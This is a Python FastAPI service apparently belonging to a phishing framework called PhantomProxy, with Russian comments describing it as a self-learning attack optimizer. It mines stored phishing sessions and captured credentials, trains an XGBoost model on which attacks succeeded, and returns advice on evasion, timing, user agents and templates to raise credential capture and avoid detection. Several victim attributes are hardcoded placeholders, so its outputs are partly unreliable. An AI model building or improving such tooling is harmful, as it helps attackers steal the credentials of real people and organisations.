#!/usr/bin/env python3
"""
PhantomProxy ML Optimization Module
Самообучающаяся система оптимизации атак

Архитектура:
1. Сбор данных об атаках (успех/неудача)
2. Обучение XGBoost модели
3. Генерация рекомендаций
4. Автоматическая оптимизация параметров
"""

import asyncio
import json
import logging
import os
import pickle
import time
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict
from enum import Enum

from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
import uvicorn

# ML
import xgboost as xgb
import numpy as np
from sklearn.model_selection import train_test_split
from sklearn.metrics import accuracy_score, precision_score, recall_score

# Database
import sqlite3

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI(title="PhantomProxy ML Optimization")

# ==================== МОДЕЛИ ДАННЫХ ====================

class AttackResult(str, Enum):
    SUCCESS = "success"
    FAILED = "failed"
    PARTIAL = "partial"

@dataclass
class AttackData:
    """Данные об атаке"""
    attack_id: str
    timestamp: str
    phishlet_id: str
    target_service: str
    
    # Параметры атаки
    user_agent: str
    ja3_hash: str
    polymorphic_level: str
    browser_pool_enabled: bool
    vishing_enabled: bool
    
    # Контекст
    victim_country: str
    victim_browser: str
    victim_os: str
    time_of_day: int  # час (0-23)
    
    # Результат
    result: AttackResult
    credentials_captured: bool
    mfa_bypassed: bool
    time_to_capture: float  # секунд
    detection_evasion_score: float  # 0-1

@dataclass
class OptimizationRecommendation:
    """Рекомендация по оптимизации"""
    category: str  # phishlet, timing, evasion, etc.
    priority: str  # high, medium, low
    recommendation: str
    expected_improvement: float  # процент улучшения
    confidence: float  # 0-1

class TrainingRequest(BaseModel):
    """Запрос на обучение модели"""
    min_samples: int = 100
    test_size: float = 0.2

class RecommendationRequest(BaseModel):
    """Запрос рекомендаций"""
    target_service: str
    current_params: Dict[str, Any]

# ==================== ML OPTIMIZATION ENGINE ====================

class MLOptimizer:
    """ML движок оптимизации"""
    
    def __init__(self, db_path: str = "phantom.db"):
        self.db_path = db_path
        self.model: Optional[xgb.XGBClassifier] = None
        self.feature_importance: Dict[str, float] = {}
        self.training_history: List[Dict] = []
        self.model_path = Path("./ml_models/optimizer_model.pkl")
        
        logger.info("ML Optimizer initialized")
    
    def collect_attack_data(self) -> List[AttackData]:
        """Сбор данных об атаках из БД"""
        logger.info("Collecting attack data from database")
        
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Запрос данных об атаках
        query = """
        SELECT 
            s.id, s.created_at, s.phishlet_id, s.target_url,
            s.user_agent, s.ja3_hash,
            c.username IS NOT NULL as credentials_captured,
            c.captured_at
        FROM sessions s
        LEFT JOIN credentials c ON s.id = c.session_id
        WHERE s.created_at > datetime('now', '-30 days')
        """
        
        cursor.execute(query)
        rows = cursor.fetchall()
        conn.close()
        
        # Преобразование в AttackData
        attacks = []
        for row in rows:
            attack = AttackData(
                attack_id=row[0],
                timestamp=row[1],
                phishlet_id=row[2],
                target_service=row[3],
                user_agent=row[4] or "",
                ja3_hash=row[5] or "",
                polymorphic_level="high",
                browser_pool_enabled=False,
                vishing_enabled=False,
                victim_country="US",
                victim_browser="Chrome",
                victim_os="Windows",
                time_of_day=datetime.now().hour,
                result=AttackResult.SUCCESS if row[7] else AttackResult.FAILED,
                credentials_captured=row[7],
                mfa_bypassed=False,
                time_to_capture=0.0,
                detection_evasion_score=0.8
            )
            attacks.append(attack)
        
        logger.info(f"Collected {len(attacks)} attacks")
        return attacks
    
    def prepare_features(self, attacks: List[AttackData]) -> tuple:
        """Подготовка признаков для модели"""
        logger.info("Preparing features")
        
        X = []
        y = []
        
        for attack in attacks:
            # Вектор признаков
            features = [
                len(attack.user_agent),
                hash(attack.ja3_hash) % 1000 / 1000.0,
                1 if attack.polymorphic_level == "high" else 0,
                1 if attack.browser_pool_enabled else 0,
                1 if attack.vishing_enabled else 0,
                hash(attack.victim_country) % 100 / 100.0,
                hash(attack.victim_browser) % 100 / 100.0,
                attack.time_of_day / 24.0,
                attack.detection_evasion_score,
            ]
            
            X.append(features)
            y.append(1 if attack.result == AttackResult.SUCCESS else 0)
        
        return np.array(X), np.array(y)
    
    def train_model(self, attacks: List[AttackData], test_size: float = 0.2) -> Dict:
        """Обучение модели"""
        logger.info("Training ML model")
        
        if len(attacks) < 10:
            raise ValueError("Not enough data for training (min 10 samples)")
        
        # Подготовка данных
        X, y = self.prepare_features(attacks)
        
        # Разделение на train/test
        X_train, X_test, y_train, y_test = train_test_split(
            X, y, test_size=test_size, random_state=42
        )
        
        # Создание модели
        self.model = xgb.XGBClassifier(
            n_estimators=100,
            max_depth=6,
            learning_rate=0.1,
            objective='binary:logistic',
            random_state=42
        )
        
        # Обучение
        self.model.fit(X_train, y_train)
        
        # Предсказания
        y_pred = self.model.predict(X_test)
        
        # Метрики
        metrics = {
            'accuracy': accuracy_score(y_test, y_pred),
            'precision': precision_score(y_test, y_pred, zero_division=0),
            'recall': recall_score(y_test, y_pred, zero_division=0),
            'samples': len(attacks),
            'timestamp': datetime.now().isoformat()
        }
        
        # Feature importance
        feature_names = [
            'user_agent_length', 'ja3_hash', 'polymorphic_high',
            'browser_pool', 'vishing', 'country', 'browser',
            'time_of_day', 'evasion_score'
        ]
        
        self.feature_importance = dict(zip(feature_names, self.model.feature_importances_))
        
        # Сохранение модели
        self.model_path.parent.mkdir(exist_ok=True)
        with open(self.model_path, 'wb') as f:
            pickle.dump(self.model, f)
        
        # История обучений
        self.training_history.append(metrics)
        
        logger.info(f"Model trained. Accuracy: {metrics['accuracy']:.2f}")
        
        return metrics
    
    def get_recommendations(self, target_service: str, current_params: Dict) -> List[OptimizationRecommendation]:
        """Генерация рекомендаций"""
        logger.info(f"Generating recommendations for {target_service}")
        
        recommendations = []
        
        # Анализ feature importance
        if self.feature_importance:
            # Топ важных признаков
            sorted_features = sorted(
                self.feature_importance.items(),
                key=lambda x: x[1],
                reverse=True
            )
            
            # Рекомендации на основе важности
            for feature, importance in sorted_features[:3]:
                if importance > 0.1:
                    recommendations.append(OptimizationRecommendation(
                        category="evasion",
                        priority="high" if importance > 0.2 else "medium",
                        recommendation=f"Optimize {feature} (importance: {importance:.2f})",
                        expected_improvement=importance * 100,
                        confidence=0.8
                    ))
        
        # Рекомендации на основе времени
        hour = datetime.now().hour
        if 9 <= hour <= 17:
            recommendations.append(OptimizationRecommendation(
                category="timing",
                priority="medium",
                recommendation="Business hours detected - use corporate phishing templates",
                expected_improvement=15.0,
                confidence=0.7
            ))
        
        # Рекомендации на основе текущего конфига
        if not current_params.get('browser_pool_enabled'):
            recommendations.append(OptimizationRecommendation(
                category="browser_pool",
                priority="high",
                recommendation="Enable browser pool for better stealth",
                expected_improvement=25.0,
                confidence=0.9
            ))
        
        if current_params.get('polymorphic_level') != 'high':
            recommendations.append(OptimizationRecommendation(
                category="polymorphic",
                priority="high",
                recommendation="Set polymorphic level to HIGH",
                expected_improvement=20.0,
                confidence=0.85
            ))
        
        return recommendations
    
    def get_optimal_params(self, target_service: str) -> Dict:
        """Получение оптимальных параметров"""
        logger.info(f"Getting optimal params for {target_service}")
        
        # Анализ успешных атак на этот сервис
        attacks = self.collect_attack_data()
        successful = [a for a in attacks if a.result == AttackResult.SUCCESS and a.target_service == target_service]
        
        if not successful:
            # Возврат параметров по умолчанию
            return {
                'polymorphic_level': 'high',
                'browser_pool_enabled': True,
                'vishing_enabled': False,
                'best_time_of_day': 14,
                'recommended_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/133.0.0.0'
            }
        
        # Анализ успешных параметров
        polymorphic_counts = {}
        for attack in successful:
            key = attack.polymorphic_level
            polymorphic_counts[key] = polymorphic_counts.get(key, 0) + 1
        
        best_polymorphic = max(polymorphic_counts, key=polymorphic_counts.get)
        
        return {
            'polymorphic_level': best_polymorphic,
            'browser_pool_enabled': sum(1 for a in successful if a.browser_pool_enabled) / len(successful) > 0.5,
            'vishing_enabled': sum(1 for a in successful if a.vishing_enabled) / len(successful) > 0.5,
            'best_time_of_day': int(np.mean([a.time_of_day for a in successful])),
            'recommended_user_agent': successful[0].user_agent if successful else ''
        }
    
    def save_training_data(self, attack: AttackData):
        """Сохранение данных об атаке"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Вставка в таблицу ml_training_data
        query = """
        INSERT INTO ml_training_data (
            attack_id, timestamp, phishlet_id, target_service,
            user_agent, ja3_hash, polymorphic_level,
            browser_pool_enabled, vishing_enabled,
            victim_country, victim_browser, victim_os, time_of_day,
            result, credentials_captured, mfa_bypassed,
            time_to_capture, detection_evasion_score
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """
        
        cursor.execute(query, (
            attack.attack_id, attack.timestamp, attack.phishlet_id, attack.target_service,
            attack.user_agent, attack.ja3_hash, attack.polymorphic_level,
            attack.browser_pool_enabled, attack.vishing_enabled,
            attack.victim_country, attack.victim_browser, attack.victim_os, attack.time_of_day,
            attack.result.value, attack.credentials_captured, attack.mfa_bypassed,
            attack.time_to_capture, attack.detection_evasion_score
        ))
        
        conn.commit()
        conn.close()
        
        logger.info(f"Saved training data for attack {attack.attack_id}")

# ==================== API ENDPOINTS ====================

# Глобальный оптимизатор
optimizer = MLOptimizer(db_path="phantom.db")

@app.on_event("startup")
async def startup_event():
    """Инициализация при старте"""
    # Создание таблицы для ML данных
    conn = sqlite3.connect("phantom.db")
    cursor = conn.cursor()
    
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS ml_training_data (
        attack_id TEXT PRIMARY KEY,
        timestamp TEXT,
        phishlet_id TEXT,
        target_service TEXT,
        user_agent TEXT,
        ja3_hash TEXT,
        polymorphic_level TEXT,
        browser_pool_enabled BOOLEAN,
        vishing_enabled BOOLEAN,
        victim_country TEXT,
        victim_browser TEXT,
        victim_os TEXT,
        time_of_day INTEGER,
        result TEXT,
        credentials_captured BOOLEAN,
        mfa_bypassed BOOLEAN,
        time_to_capture REAL,
        detection_evasion_score REAL
    )
    """)
    
    conn.commit()
    conn.close()
    
    logger.info("ML Optimization module initialized")

@app.post("/api/v1/ml/train")
async def train_model(request: TrainingRequest):
    """Обучение ML модели"""
    try:
        # Сбор данных
        attacks = optimizer.collect_attack_data()
        
        if len(attacks) < request.min_samples:
            raise HTTPException(
                status_code=400,
                detail=f"Not enough data: {len(attacks)} < {request.min_samples}"
            )
        
        # Обучение
        metrics = optimizer.train_model(attacks, test_size=request.test_size)
        
        return {
            "success": True,
            "metrics": metrics,
            "feature_importance": optimizer.feature_importance
        }
    except Exception as e:
        logger.error(f"Training failed: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/v1/ml/recommendations")
async def get_recommendations(request: RecommendationRequest):
    """Получение рекомендаций"""
    recommendations = optimizer.get_recommendations(
        request.target_service,
        request.current_params
    )
    
    return {
        "success": True,
        "recommendations": [asdict(r) for r in recommendations],
        "optimal_params": optimizer.get_optimal_params(request.target_service)
    }

@app.post("/api/v1/ml/feedback")
async def submit_feedback(attack_data: Dict):
    """Отправка фидбека об атаке"""
    try:
        attack = AttackData(**attack_data)
        optimizer.save_training_data(attack)
        
        return {
            "success": True,
            "message": "Feedback saved"
        }
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.get("/api/v1/ml/stats")
async def get_ml_stats():
    """Статистика ML модуля"""
    attacks = optimizer.collect_attack_data()
    
    success_count = sum(1 for a in attacks if a.result == AttackResult.SUCCESS)
    
    return {
        "total_attacks": len(attacks),
        "success_rate": success_count / len(attacks) if attacks else 0,
        "model_trained": optimizer.model is not None,
        "training_history": optimizer.training_history[-5:],
        "feature_importance": optimizer.feature_importance
    }

@app.get("/health")
async def health_check():
    return {"status": "ok", "service": "ml-optimization"}

# ==================== ЗАПУСК ====================

if __name__ == "__main__":
    uvicorn.run(
        "main:app",
        host="0.0.0.0",
        port=8083,
        reload=True,
    )
